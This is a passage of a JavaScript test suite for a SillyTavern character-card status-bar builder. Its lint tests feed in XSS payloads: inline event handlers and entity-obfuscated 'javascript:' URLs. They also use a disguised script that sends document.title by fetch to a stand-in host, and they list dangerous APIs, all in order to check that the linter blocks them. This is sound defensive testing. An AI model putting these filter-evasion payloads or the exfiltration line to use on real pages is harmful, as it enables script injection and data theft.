    assert.ok(shown.includes('&lt;i&gt;斜&lt;/i&gt;&amp;') && !shown.includes('<i>斜'));
});

test('buildPreviewSrcdoc：预览里的文档与酒馆显示导出卡片时 iframe 收到的完全一致', () => {
    const c = card({ mode: 'bind', html: '<b data-nl-text="林小雨.心情" title="1 &lt; 2">{{user}} &amp; {{char}} &#36;</b><script>window.nlRender = function () { return 1 && 2; };</script>' });
    const src = buildPreviewSrcdoc(c, null, { user: '小明', char: '林小雨' });
    const body = previewBody(src);
    const exported = simulateStRegexReplace(buildStatusRegexScripts(c)[0].replaceString, { match: STATUS_TAG, user: '小明', char: '林小雨' });
    assert.equal(body, stIframeText(`回复\n\n${exported}`));
    assert.equal(body, simulateShownDocument(compileStatusDocument(c), { user: '小明', char: '林小雨' }));
    assert.ok(body.includes('title="1 &lt; 2">小明 &amp; 林小雨 &#36;</b>'), '实体只解一层：原文里的 &lt; 仍是 &lt;');
    assert.ok(body.includes('return 1 && 2;'));
});

test('simulateStRegexReplace：捕获组、{{match}}、旧式占位符、宏', () => {
    assert.equal(simulateStRegexReplace('[$1|$2|$0|$9]', { match: 'M', groups: ['a', 'b'] }), '[a|b|M|]');
    assert.equal(simulateStRegexReplace('{{match}}!', { match: 'M' }), 'M!');
    assert.equal(simulateStRegexReplace('<USER>/<bot>/{{char}}/{{x}}', { user: '小明', char: '林' }), '小明/林/林/');
    assert.equal(simulateStRegexReplace('$<g>', { named: { g: 'G' } }), 'G');
    assert.equal(simulateStRegexReplace('/\\{x\\}/'), '/{x}/', '新宏引擎去掉花括号前的反斜杠');
});

// ---------------- 角色脚本 ----------------

/** 酒馆助手 4.11.3 src/type/scripts.ts + settings.ts 的 CharacterSettings 移植 */
function jsrCharacterSettings() {
    const ScriptButton = z.object({ name: z.coerce.string(), visible: z.boolean() });
    const ScriptExportWith = z.object({ data: z.boolean().prefault(true).catch(true), button: z.boolean().prefault(true).catch(true) }).prefault({});
    const Script = z.object({
        type: z.literal('script').default('script'),
        enabled: z.boolean().default(false),
        name: z.coerce.string().default(''),
        id: z.coerce.string().default(() => 'generated'),
        content: z.coerce.string().default(''),
        info: z.coerce.string().default(''),
        button: z.object({ enabled: z.boolean().default(true), buttons: z.array(ScriptButton).default([]) }).prefault({}),
        data: z.record(z.string(), z.any()).default({}).catch({}),
        export_with: ScriptExportWith,
    });
    const ScriptFolder = z.object({
        type: z.literal('folder').default('folder'),
        enabled: z.boolean().default(false),
        name: z.coerce.string().default(''),
        id: z.coerce.string().default(() => 'generated'),
        icon: z.string().default('fa-solid fa-folder'),
        color: z.string().default('#fff'),
        scripts: z.array(Script).default([]),
    });
    const ScriptTree = z.discriminatedUnion('type', [Script, ScriptFolder]);
    return z.object({
        scripts: z.array(ScriptTree).default([]).catch([]),
        variables: z.record(z.string(), z.any()).default({}).catch({}),
    }).prefault({});
}

test('buildTavernHelper：符合酒馆助手的 Script 结构，启用、uuid、无文件夹、无 </script', needZod, () => {
    const c = card();
    const th = buildTavernHelper(c, { mvuUrl: 'https://example.com/bundle.js', zodUrl: 'https://example.com/z.js' });
    const parsed = jsrCharacterSettings().parse(structuredClone(th));
    assert.equal(parsed.scripts.length, 2, '一条不合法就会被整体清空，所以两条都要在');
    assert.deepEqual(parsed, th, '解析前后完全一致（没有依赖默认值）');
    for (const s of th.scripts) {
        assert.equal(s.type, 'script');
        assert.equal(s.enabled, true);
        assert.match(s.id, /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/);
        assert.ok(!/<\/script/i.test(s.content));
        assert.ok(!s.content.trim().startsWith('```'));
        assert.deepEqual(s.button, { enabled: true, buttons: [] });
    }
    assert.deepEqual(th.variables, {});
    assert.equal(th.scripts[0].name, 'MVU');
    assert.equal(th.scripts[0].id, c.statusBar.ids.scriptMvu);
    assert.equal(th.scripts[0].content, "import 'https://example.com/bundle.js';");
    assert.equal(th.scripts[1].name, '变量结构');
    assert.equal(th.scripts[1].id, c.statusBar.ids.scriptSchema);
    assert.ok(th.scripts[1].content.includes('from "https://example.com/z.js"'));
    // 高级覆盖：原样使用，但 </script 会被改写
    c.statusBar.overrides.schemaScript = 'const s = "</script>";';
    const th2 = buildTavernHelper(c, {});
    assert.equal(th2.scripts[1].content, 'const s = "<\\/script>";');
    assert.ok(th2.scripts[0].content.includes(DEFAULT_STATUS_BAR.mvuUrl), '没给地址时用默认 CDN');
});

// ---------------- 界面检查 ----------------

test('lintStatusHtml：替换隐患是错误；危险代码在绑定模式是错误、自定义模式是警告', () => {
    const clean = '<style>.a{color:red}</style><div data-nl-text="林小雨.好感度"></div><script>window.nlRender = function (stat, ctx) { $(".a").text(ctx.get("x", 1)); };</script>';
    assert.deepEqual(lintStatusHtml(clean, { mode: 'bind', spec: spec() }), { errors: [], warnings: [] });
    const errs = (html, mode = 'bind') => lintStatusHtml(html, { mode }).errors;
    assert.ok(errs('<b>$1</b>').length);
    assert.ok(errs('<b>{{random}}</b>').length);
    assert.equal(errs('<b>{{user}} {{char}}</b>').length, 0);
    assert.ok(errs('<b><user></b>').length);
    assert.ok(errs('<b>```</b>').length);
    assert.ok(errs('<script>var r = /\\{/;</script>').length, '\\{ 会被宏引擎改写');
    assert.ok(errs('<script>var s = "</script>";</script>').length, 'script 标签不成对');
    for (const js of ['fetch("/x")', 'new XMLHttpRequest()', 'parent.document', 'window.top.location', 'localStorage.setItem("a",1)', 'eval("1")', 'import("x")', 'triggerSlash("/x")', 'SillyTavern.getContext()', 'replaceVariables({})', 'generate({})']) {
        assert.ok(errs(`<div data-nl-text="a"></div><script>${js}</script>`).length, js);
        const raw = lintStatusHtml(`<body><script>${js}; getAllVariables();</script></body>`, { mode: 'raw' });
        assert.equal(raw.errors.length, 0, `raw 模式不阻止：${js}`);
        assert.ok(raw.warnings.length, `raw 模式给警告：${js}`);
    }
    assert.ok(errs('<script src="https://x/y.js"></script>').length);
    assert.ok(errs('<iframe src="x"></iframe>').length);
    assert.ok(errs('<div onclick="fetch(1)">x</div>').length, '内联事件也检查');
    assert.equal(errs('<div style="top:0;position:absolute" data-nl-text="a"></div>').length, 0, 'CSS 的 top 不算访问上层页面');
    const warn = (html, opt = { mode: 'bind' }) => lintStatusHtml(html, opt).warnings.join('\n');
    assert.match(warn('<div style="height:50vh" data-nl-text="a"></div>'), /vh/);
    assert.match(warn('<div style="position: fixed" data-nl-text="a"></div>'), /fixed/);
    assert.match(warn('<img src="https://x/a.png"><b data-nl-text="a"></b>'), /外部/);
    assert.match(warn('<html><body><b data-nl-text="a"></b></body></html>'), /自动去掉/);
    assert.match(warn('<div>没有绑定</div>'), /没有任何 data-nl-\*/);
    assert.match(warn('<div data-nl-text="不存在.路径"></div><b data-nl-text="主角.物品.旧钥匙"></b><i data-nl-each="林小雨"></i>', { mode: 'bind', spec: spec() }), /没有的路径：不存在\.路径$/m);
    assert.match(warn('', { mode: 'bind' }), /内置排版/);
    assert.ok(lintStatusHtml('', { mode: 'raw' }).errors.length);
    assert.match(warn('<body>hi</body>', { mode: 'raw' }), /stat_data/);
});

test('cleanFragment 去到不再变化为止；lintStatusHtml 检查的正是 compileStatusDocument 嵌入的片段', () => {
    assert.equal(cleanFragment('<bo<body>dy><b>x</b></bo</body>dy>'), '<b>x</b>');
    assert.equal(cleanFragment('<ht<html>ml><he<head>ad></he</head>ad><!do<!doctype html>ctype html><i>y</i>'), '<i>y</i>');
    assert.equal(cleanFragment('```html\n```html\n<p>a</p>\n```\n```'), '<p>a</p>', '嵌套的代码块也去掉');
    const once = (h) => cleanFragment(h);
    for (const h of ['<bo<body>dy>x', '<<body>script>1<</body>/script>', '  <p>a</p>  ']) assert.equal(cleanFragment(once(h)), once(h), '结果是不动点');
    // 去掉 <body> 后才拼出来的 <script>：以前检查的是原文（看不到这段脚本），导出的却是去掉之后的
    const sneaky = '<b data-nl-text="林小雨.好感度"></b><<body>script>fetch("https://x.example/" + document.title)<</body>/script>';
    const c = card({ mode: 'bind', html: sneaky });
    assert.ok(compileStatusDocument(c).includes('<script>fetch('), '文档里嵌入的是清理后的片段');
    assert.match(lintStatusHtml(sneaky, { mode: 'bind' }).errors.join('\n'), /网络请求/);
    assert.throws(() => buildStatusRegexScripts(c), StatusBarExportError);
    // 带外层代码块的片段 / 自定义文档：导出时会被去掉，所以不算「出现了 ```」
    assert.deepEqual(lintStatusHtml('```html\n<b data-nl-text="a"></b>\n```', { mode: 'bind' }).errors, []);
    const rawDoc = '```html\n<body><script>getAllVariables()</script></body>\n```';
    assert.deepEqual(lintStatusHtml(rawDoc, { mode: 'raw' }).errors, []);
    assert.equal(compileStatusDocument(card({ mode: 'raw', html: rawDoc })), '<body><script>getAllVariables()</script></body>');
});

test('lintStatusHtml：bind/auto 下任何内联事件属性与 javascript:/vbscript:/data:text/html 地址都是错误', () => {
    const errs = (html, mode = 'bind') => lintStatusHtml(html, { mode }).errors.join('\n');
    const handlers = [
        '<div onclick=go()>x</div>',
        '<div onclick="go()">x</div>',
        "<img src=x onerror='go()'>",
        '<svg/onload=go()></svg>',
        '<b data-nl-text="a" ONMOUSEOVER = "go()"></b>',
        '<p title="a>b" onfocus=go()>x</p>',
        '<script>el.innerHTML = \'<i onclick=go()>\';</script>',
        '<span>1<y "</span><div onclick=go()>x</div><span>"</span>',
    ];
    for (const h of handlers) {
        assert.match(errs(h), /内联事件属性/, h);
        assert.match(errs(h, 'auto'), /内联事件属性/, h);
        assert.doesNotMatch(errs(h, 'raw'), /内联事件属性/, `raw 模式不因内联事件报错：${h}`);
    }
    const urls = [
        '<a href="javascript:go()">x</a>',
        '<a href=" JaVaScRiPt:go()">x</a>',
        '<a href="java&#115;cript:go()">x</a>',
        '<a href="jav&#x09;ascript:go()">x</a>',
        '<a href="javascript&colon;go()">x</a>',
        '<a href="vbscript:msgbox(1)">x</a>',
        '<a href="data:text/html,<b>x</b>">x</a>',
        '<div style="background:url(javascript:go())"></div>',
    ];
    for (const h of urls) {
        assert.match(errs(h), /javascript: \/ vbscript: \/ data:text\/html/, h);
        assert.match(errs(h, 'auto'), /javascript:/, h);
    }
    // 不误报：data-* 属性、普通地址、图片 data URL、脚本里的 onX 变量与 addEventListener
    for (const ok of [
        '<div data-on="x" data-nl-text="a"></div>',
        '<a href="https://example.com/?a=1&b=2" data-nl-text="a"></a>',
        '<b data-nl-text="a"></b><script>var once = 1; var onDone = function () {}; document.body.addEventListener("click", onDone);</script>',
        '<b data-nl-text="a">在线 online</b>',
    ]) assert.equal(errs(ok), '', ok);
    // raw 模式里内联事件的代码也会被检查危险接口（不带引号的写法也算）
    assert.match(lintStatusHtml('<body><div onclick=fetch(1)>x</div><script>getAllVariables()</script></body>', { mode: 'raw' }).warnings.join('\n'), /网络请求/);
});

// ---------------- JSON Patch ----------------

test('applyJsonPatch：replace / delta / insert（含 /-）/ remove / move，只读路径与错误', () => {
    const state = { a: { n: 1, list: ['x'], obj: { k: 1 } }, _r: 1 };
    const r = applyJsonPatch(state, [
        { op: 'replace', path: '/a/n', value: 5 },
        { op: 'delta', path: '/a/n', value: -2 },
        { op: 'insert', path: '/a/list/-', value: 'y' },
        { op: 'insert', path: '/a/list/0', value: 'w' },
        { op: 'add', path: '/a/obj/新键', value: { 数量: 1 } },
        { op: 'remove', path: '/a/list/1' },
        { op: 'remove', path: '/a/obj/k' },
        { op: 'move', from: '/a/obj/新键', to: '/b/c' },
        { op: 'move', from: '/b/c', path: '/b/d' },
        { op: 'insert', path: '/新/-', value: 1 },
        { op: 'replace', path: '/a~1b/c~0d', value: 1 },
        { op: 'delta', path: '/a/list', value: 1 },
        { op: 'remove', path: '/不存在' },
        { op: 'replace', path: '/_r', value: 2 },
        { op: 'move', from: '/无', to: '/x' },
        { op: 'copy', path: '/x' },
    ]);
    assert.deepEqual(r.state, { a: { n: 3, list: ['w', 'y'], obj: {} }, _r: 1, b: { d: { 数量: 1 } }, 新: [1], 'a/b': { 'c~d': 1 } });
    assert.equal(r.applied, 11);
    assert.equal(r.errors.length, 5);
    assert.match(r.errors.join('\n'), /非数字/);
    assert.match(r.errors.join('\n'), /只读/);
    assert.deepEqual(state.a.n, 1, '不修改传入的对象');
});

test('applyJsonPatch + 变量表：校验失败的操作整条作废，数字夹取', () => {
    const s = spec();
    const init = buildInitialState(s);
    const r = applyJsonPatch(init, [
        { op: 'delta', path: '/林小雨/好感度', value: 500 },
        { op: 'replace', path: '/林小雨/心情', value: '狂喜' },
        { op: 'replace', path: '/林小雨/心情', value: '开心' },
        { op: 'insert', path: '/林小雨/状态/-', value: '饥饿' },
        { op: 'insert', path: '/主角/物品/火把', value: { 数量: 2 } },
        { op: 'remove', path: '/主角/物品/旧钥匙' },
        { op: 'replace', path: '/林小雨/未知', value: 1 },
    ], { spec: s });
    assert.equal(r.state.林小雨.好感度, 100);
    assert.equal(r.state.林小雨.心情, '开心');
    assert.deepEqual(r.state.林小雨.状态, ['疲惫', '饥饿']);
    assert.deepEqual(r.state.主角.物品, { 火把: { 数量: 2, 描述: '' } });
    assert.ok(!('未知' in r.state.林小雨), '嵌套分组里的未知键被丢弃');
    assert.equal(r.errors.length, 1);
    assert.match(r.errors[0], /只能是 平静\/开心\/低落/);
});

test('extractJsonPatch / applyReplyToState：从回复里取 <JSONPatch>（可带代码块、可修复）', () => {
    const reply = '正文\n<UpdateVariable>\n<Analysis>..</Analysis>\n<JSONPatch>\n```json\n[{"op":"delta","path":"/林小雨/好感度","value":3},]\n```\n</JSONPatch>\n</UpdateVariable>\n<json_patch>[{"op":"replace","path":"/世界/时间","value":"晚上"}]</json_patch>';
    const ops = extractJsonPatch(reply);
    assert.equal(ops.length, 2);
    const s = spec();
    const r = applyReplyToState(buildInitialState(s), reply, { spec: s });
    assert.equal(r.state.林小雨.好感度, 33);
    assert.equal(r.state.世界.时间, '晚上');
    assert.equal(r.applied, 2);
    assert.match(applyReplyToState({}, '没有更新').errors[0], /没有找到/);
});

test('applyReplyToState：找到了 <JSONPatch> 块但解析不了时报出原因，不再误报「没有找到」', () => {
    const s = spec();
    const init = buildInitialState(s);
    // 内容不是 JSON
    const bad = applyReplyToState(init, '正文\n<JSONPatch>\n这不是 JSON\n</JSONPatch>', { spec: s });
    assert.equal(bad.applied, 0);
    assert.equal(bad.errors.length, 1);
    assert.match(bad.errors[0], /^找到了 <JSONPatch> 块，但内容不是合法的 JSON：.+（块内容：这不是 JSON）$/);
    assert.ok(!bad.errors.some((e) => /没有找到/.test(e)));
    assert.equal(bad.failures[0].kind, 'json');
    assert.match(applyReplyToState(init, '<JSONPatch></JSONPatch>').errors[0], /不是合法的 JSON：块是空的/);
    // 是 JSON 但不是 JSON Patch 数组：与 MVU 一样整块忽略
    const obj = applyReplyToState(init, '<JSONPatch>{"op":"replace","path":"/林小雨/心情","value":"开心"}</JSONPatch>', { spec: s });
    assert.equal(obj.applied, 0);
    assert.match(obj.errors[0], /^找到了 <JSONPatch> 块，但内容不是 JSON 数组，MVU 会忽略整个块/);
    const mixed = applyReplyToState(init, '<JSONPatch>[{"op":"replace","path":"/林小雨/心情","value":"开心"},{"value":1}]</JSONPatch>', { spec: s });
    assert.equal(mixed.applied, 0);
    assert.match(mixed.errors[0], /第 2 项不是合法的 JSON Patch 操作/);
    // 一个好块 + 一个坏块：好块照常应用，坏块单独报错
    const two = applyReplyToState(init, '<JSONPatch>[{"op":"delta","path":"/林小雨/好感度","value":2}]</JSONPatch>\n<json_patch>[{"op":</json_patch>', { spec: s });
    assert.equal(two.applied, 1);
    assert.equal(two.state.林小雨.好感度, 32);
    assert.equal(two.errors.length, 1);
    assert.match(two.errors[0], /不是合法的 JSON/);
    // 空数组是合法的“本轮没有变化”，什么都不报
    const empty = applyReplyToState(init, '<UpdateVariable><JSONPatch>[]</JSONPatch></UpdateVariable>', { spec: s });
    assert.deepEqual(empty.errors, []);
    assert.deepEqual(empty.state, init);
    // parseJsonPatchBlocks / extractJsonPatch 的返回形状
    const p = parseJsonPatchBlocks('<JSONPatch>[]</JSONPatch><JSONPatch>x</JSONPatch>');
    assert.equal(p.blocks, 2);
    assert.equal(p.failures.length, 1);
    assert.deepEqual(extractJsonPatch('<JSONPatch>x</JSONPatch>'), []);
});

// ---------------- 状态栏对象 ----------------

test('ensureStatusBar / createStatusBar：默认值来自设置、id 稳定、补齐缺失字段', () => {
    const settings = mergeDefaults({}, DEFAULT_SETTINGS);
    assert.equal(settings.cards.statusBar, false);
    assert.equal(settings.cards.statusBarTemplateId, '');
    assert.equal(settings.statusBar.maxVars, 12);
    assert.equal(settings.statusBar.showDepth, 1);
    assert.equal(settings.statusBar.analysisLang, 'en');
    assert.deepEqual(settings.statusBarTemplates, []);
    settings.statusBar.showDepth = null;
    settings.statusBar.htmlMode = 'auto';
    assert.equal(mergeDefaults(settings, DEFAULT_SETTINGS).statusBar.showDepth, null, '“每一层”(null) 不会被默认值覆盖');
    const c = { data: { name: 'x' } };
    const sb = ensureStatusBar(c, settings);
    assert.equal(c.statusBar, sb);
    assert.equal(sb.version, 1);
    assert.equal(sb.enabled, true);
    assert.equal(sb.mode, 'auto');
    assert.equal(sb.options.showDepth, null);
    assert.deepEqual(Object.keys(sb.ids).sort(), [...STATUS_BAR_IDS].sort());
    const ids = { ...sb.ids };
    delete sb.ids.scriptMvu;
    delete sb.options.foldUpdate;
    sb.lint = null;
    ensureStatusBar(c, settings);
    assert.equal(sb.ids.regexBar, ids.regexBar, '已有 id 不变');
    assert.ok(sb.ids.scriptMvu && sb.ids.scriptMvu !== ids.scriptMvu, '缺失的 id 补上');
    assert.equal(sb.options.foldUpdate, true);
    assert.deepEqual(sb.lint, { errors: [], warnings: [] });
    assert.equal(createStatusBar({}).mode, 'bind', "htmlMode 'ai' → 绑定模式");
    assert.equal(statusBarActive(c), false, '没有变量时不导出');
    sb.spec = spec();
    assert.equal(statusBarActive(c), true);
    sb.enabled = false;
    assert.equal(statusBarActive(c), false);
    assert.match(uuidv4(), /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/);
});

test('withStatusTag：末尾追加一次，空开场白只有标签', () => {
    assert.equal(withStatusTag('你好。\n\n'), `你好。\n\n${STATUS_TAG}`);
    assert.equal(withStatusTag(withStatusTag('你好')), `你好\n\n${STATUS_TAG}`);
    assert.equal(withStatusTag(''), STATUS_TAG);
});

// ---------------- 运行时、文档与预览 ----------------

test('NL 运行时：是合法 JS，且不含会被酒馆或浏览器误伤的序列', () => {
    const rt = buildNlRuntime();
    assert.doesNotThrow(() => new Function(rt));
    assert.ok(!rt.includes('`'));
    assert.ok(!rt.includes('{{'));
    assert.ok(!/\$(\d|<)/.test(rt));
    assert.ok(!/<\/script/i.test(rt));
    assert.ok(!/<(user|char|bot|group)>/i.test(rt));
    assert.ok(!/\\[{}]/.test(rt));
    assert.ok(rt.includes("waitGlobalInitialized('Mvu')"));
    assert.ok(rt.includes('VARIABLE_UPDATE_ENDED'));
    assert.ok(rt.includes('errorCatched'));
    assert.ok(rt.includes('getAllVariables'));
    assert.ok(!STATUS_BINDING_GUIDE.includes('{{'));
    // 酒馆的「自动修复 Markdown」会给 * 或 " 个数为奇数的行末尾补一个：运行时里干脆不出现这两个字符
    assert.ok(!rt.includes('*'), '运行时里不能有 *（乘法写成除以 0.01）');
    assert.ok(!rt.includes('"'), '运行时里不能有双引号');
    assert.equal(stFixMarkdown(rt, true), rt);
});

test('酒馆「自动修复 Markdown」不会改动状态栏文档，每个 <script> 仍能解析（bind / auto 三套主题 / 五个内置模板）', () => {
    // 标题、标签、初始值里故意带 * 和 "（经 htmlSafe / jsLit 转义后每行仍是偶数个）
    const s = normalizeStatusSpec({
        title: '重要*"状态',
        variables: [
            { path: '甲.好感', label: '好*感"', type: 'number', init: 5, min: 0, max: 10, stages: [{ min: 0, label: '低*' }] },
            { path: '甲.备注', label: '备"注', type: 'string', init: '星*号"引号' },
            { path: '甲.物品', type: 'record', keyDesc: '名*称', value: { type: 'object', fields: [{ key: '数量', type: 'number', min: 0, max: 9, init: 1 }] }, init: { 'a*b': { 数量: 2 } } },
        ],
    });
    const docs = STATUSBAR_THEMES.map(({ value }) => [`auto-${value}`, compileStatusDocument({ statusBar: { mode: 'auto', theme: value, spec: s } })]);
    docs.push(['bind（空片段 → 内置排版）', compileStatusDocument({ statusBar: { mode: 'bind', html: '', spec: s } })]);
    docs.push(['bind 片段', compileStatusDocument(card({ mode: 'bind', html: '<b data-nl-text="林小雨.好感度"></b>\n<script>\nwindow.nlRender = function (stat, ctx) { document.title = "好感 " + ctx.get("林小雨.好感度", 0) / 2; };\n</script>' }))]);
    for (const t of BUILTIN_STATUSBAR_TEMPLATES) docs.push([`内置模板 ${t.name}`, compileStatusDocument({ statusBar: { mode: 'bind', html: t.html, spec: t.spec, theme: t.theme } })]);
    assert.equal(docs.length, 3 + 2 + 5);
    for (const [name, doc] of docs) {
        for (const line of doc.split('\n')) {
            assert.equal((line.split('*').length - 1) % 2, 0, `${name}：这一行的 * 是奇数个：${line.slice(0, 120)}`);
            assert.equal((line.split('"').length - 1) % 2, 0, `${name}：这一行的 " 是奇数个：${line.slice(0, 120)}`);
        }
        const replace = buildStatusRegexReplace(doc);
        // 正文里的 * _ " 会改变 fixMarkdown 的配对，几种都试一遍
        for (const prose of ['正文。', '*他笑了', '_斜体', '**粗体', '"没写完的引号', '*a* _b_ "c"']) {
            const fixed = stFixMarkdown(`${prose}\n\n${replace}`, true);
            const shown = stIframeText(fixed);
            assert.equal(shown, doc, `${name}（正文：${prose}）：状态栏文档被改写了`);
            const scripts = scriptsOf(shown);
            assert.ok(scripts.length >= 2, name);
            for (const code of scripts) assert.doesNotThrow(() => new vm.Script(code), `${name}（正文：${prose}）的脚本无法解析`);
        }
    }
    // 对照：旧写法（Math.round(v * 100)）会被补一个 * 而无法解析
    const broken = stFixMarkdown('<script>\nvar x = Math.round(v * 100) / 100;\nvar y = 1;\n</script>', true);
    assert.throws(() => new vm.Script(scriptsOf(broken)[0]), SyntaxError);
});

test('AI / 用户写的界面里有乘号、* 选择器、奇数个引号、挨着空白的 _：写进代码块时转成实体，经过「自动修复 Markdown」后 iframe 收到的仍是原文', () => {
    const nbsp = String.fromCharCode(0xa0);
    const ideo = String.fromCharCode(0x3000);
    const fragment = [
        '<style>.sb :where(*){box-sizing:border-box}.sb-bar i{width:calc(var(--p) * 1%)}</style>',
        '<div class="sb"><span data-nl-text="林小雨.好感度"></span> <i class="note">a _ b' + nbsp + '_c' + ideo + '_ d</i></div>',
        '<script>',
        'window.nlRender = function (stat, ctx) {',
        '    var pct = Math.round(ctx.get("林小雨.好感度", 0) * 100) / 100;',
        "    var quote = '\"';",
        "    var my_ = 1, x_ = my_ * 2; document.title = quote + pct + ' * ' + x_;",
        '};',
        '</script>',
    ].join('\n');
    const doc = compileStatusDocument(card({ mode: 'bind', html: fragment }));
    const replace = buildStatusRegexReplace(doc);
    const fence = unwrapStatusFence(replace);
    assert.ok(!fence.includes('*'), '代码块里不再有 *');
    for (const line of fence.split('\n')) assert.equal((line.split('"').length - 1) % 2, 0, `这一行的 " 是奇数个：${line.slice(0, 80)}`);
    assert.equal(decodeFenceText(fence), doc, '解一层实体就是原文档');
    for (const prose of ['正文。', '*他笑了', '_斜体', '**粗体', '"没写完的引号', '*a* _b_ "c"']) {
        const shown = stIframeText(stFixMarkdown(`${prose}\n\n${replace}`, true));
        assert.equal(shown, doc, `正文：${prose}`);
        for (const code of scriptsOf(shown)) assert.doesNotThrow(() => new vm.Script(code), `正文：${prose}`);
    }
    assert.equal(simulateShownDocument(doc), doc.replace(/\{\{user\}\}/g, 'User').replace(/\{\{char\}\}/g, 'Char'), '预览与导出用同一套转义');
    // 对照：只转义 & 时，奇数个 * / " 的行末尾会被补一个，脚本无法解析
    const old = `\n\`\`\`html\n${doc.replace(/&/g, '&amp;')}\n\`\`\`\n`;
    const oldShown = stIframeText(stFixMarkdown(`正文。\n\n${old}`, true));
    assert.notEqual(oldShown, doc);
    assert.ok(scriptsOf(oldShown).some((code) => {
        try {
            new vm.Script(code);
            return false;
        } catch {
            return true;
        }
    }));
});

test('compileStatusDocument：bind / auto / raw 三种模式', () => {
    const c = card({ mode: 'bind', html: '<!doctype html><html><body class="x"><b data-nl-text="林小雨.好感度"></b></body></html>' });
    const doc = compileStatusDocument(c);
    assert.ok(doc.startsWith('<!doctype html><html><head><meta charset="utf-8">'));
    assert.ok(doc.includes('<body>'));
    assert.ok(doc.includes('<b data-nl-text="林小雨.好感度"></b>'));
    assert.equal((doc.match(/<body/g) || []).length, 1, '片段里的 body 被去掉');
    assert.ok(doc.includes('window.NL_SPEC = '));
    assert.ok(doc.includes('<div class="nl-empty-hint" hidden>'));
    assert.ok(doc.indexOf('nl-empty-hint') < doc.lastIndexOf('<script>'), '运行时在最后');
    assert.deepEqual(lintStatusHtml(doc, { mode: 'raw' }).errors, [], '整份文档没有替换隐患');
    const nlSpec = JSON.parse(doc.match(/window\.NL_SPEC = (.*);<\/script>/)[1]);
    assert.deepEqual(nlSpec, runtimeSpec(c.statusBar.spec));
    assert.ok(!JSON.stringify(nlSpec).includes('check'), '运行时变量表不带 check/desc');
    // bind 但片段为空 → 内置排版
    assert.ok(compileStatusDocument(card({ mode: 'bind', html: '  ' })).includes('class="nlb nlb-theme-clean"'));
    assert.ok(compileStatusDocument(card({ mode: 'auto', theme: 'paper' })).includes('nlb-theme-paper'));
    // raw：原样；没有 body 时补一层；外层代码块去掉
    assert.equal(compileStatusDocument(card({ mode: 'raw', html: '<html><body>x</body></html>' })), '<html><body>x</body></html>');
    assert.equal(compileStatusDocument(card({ mode: 'raw', html: '```html\n<div>x</div>\n```' })), '<body>\n<div>x</div>\n</body>');
    assert.equal(cleanFragment('```html\n<head><meta x></head><p>a</p>\n```'), '<meta x><p>a</p>');
});

test('renderDefaultFragment：三套主题都能通过检查，绑定覆盖所有可见变量', () => {
    const s = spec();
    assert.equal(STATUSBAR_THEMES.length, 3);
    for (const { value } of STATUSBAR_THEMES) {
        const f = renderDefaultFragment(s, value);
        const lint = lintStatusHtml(f, { mode: 'bind', spec: s });
        assert.deepEqual(lint, { errors: [], warnings: [] }, value);
        assert.ok(f.includes(`nlb-theme-${value}`));
    }
    const f = renderDefaultFragment(s, 'clean');
    for (const v of s.variables.filter((x) => x.widget !== 'hidden')) assert.ok(f.includes(`"${v.path}"`), v.path);
    assert.ok(!f.includes('主角._回合'), 'hidden 不显示');
    assert.ok(f.includes('data-nl-bar="林小雨.好感度"'));
    assert.ok(f.includes('data-nl-stage="林小雨.好感度"'));
    assert.ok(f.includes('data-nl-each="主角.物品"'));
    assert.ok(f.includes('data-nl-item="数量"'));
    const tricky = renderDefaultFragment(normalizeStatusSpec({ title: '标题$1{x}', variables: [{ path: '甲.乙', label: '<b>$2</b>' }] }));
    assert.deepEqual(lintStatusHtml(tricky, { mode: 'bind' }).errors, [], '标题与标签里的 $ { < 被转义');
});

test('buildPreviewSrcdoc：模拟环境、示例数据、名字替换、与导出一致', () => {
    const c = card({ mode: 'bind', html: '<b data-nl-text="林小雨.心情"></b><i>{{user}} 和 {{char}}</i>' });
    const src = buildPreviewSrcdoc(c, { 林小雨: { 心情: '<开心>' } }, { user: '小明', char: '林小雨' });
    assert.ok(src.startsWith('<!DOCTYPE html>'));
    for (const name of ['getAllVariables', 'getVariables', 'getCurrentMessageId', 'getLastMessageId', 'waitGlobalInitialized', 'eventOn', 'eventOnce', 'eventEmit', 'eventRemoveListener', 'errorCatched', 'toastr', 'SillyTavern', 'tavern_events', 'iframe_events', 'mag_variable_update_ended', 'nl-sample', 'nl-height', 'nl-error']) {
        assert.ok(src.includes(name), name);
    }
    assert.ok(src.includes('e.source !== window.parent'), '只接受父窗口的消息');
    assert.ok(src.includes('<i>小明 和 林小雨</i>'), '{{user}}/{{char}} 已替换');
    assert.ok(src.includes('\\u003c开心\\u003e'), '示例数据安全嵌入');
    assert.ok(src.includes('<b data-nl-text="林小雨.心情"></b>'));
    assert.ok(src.includes('https://testingcf.jsdelivr.net/npm/jquery/dist/jquery.min.js'));
    assert.ok(src.includes('https://testingcf.jsdelivr.net/npm/lodash/lodash.min.js'));
    assert.ok(!src.includes('allow-same-origin'));
    assert.ok(!src.includes('```'), '代码块外壳已去掉');
    // 缺省示例数据：用变量表初始值
    const def = buildPreviewSrcdoc(card({ mode: 'auto' }));
    assert.ok(def.includes('"好感度":30'));
    // raw 模式才内联 tailwind，且 </script 被转义
    const raw = buildPreviewSrcdoc(card({ mode: 'raw', html: '<body>x</body>' }), {}, { tailwind: 'var a="</script>";' });
    assert.ok(raw.includes('var a="<\\/script>";'));
    assert.ok(!buildPreviewSrcdoc(card({ mode: 'auto' }), {}, { tailwind: 'TAILWIND_CODE' }).includes('TAILWIND_CODE'));
});
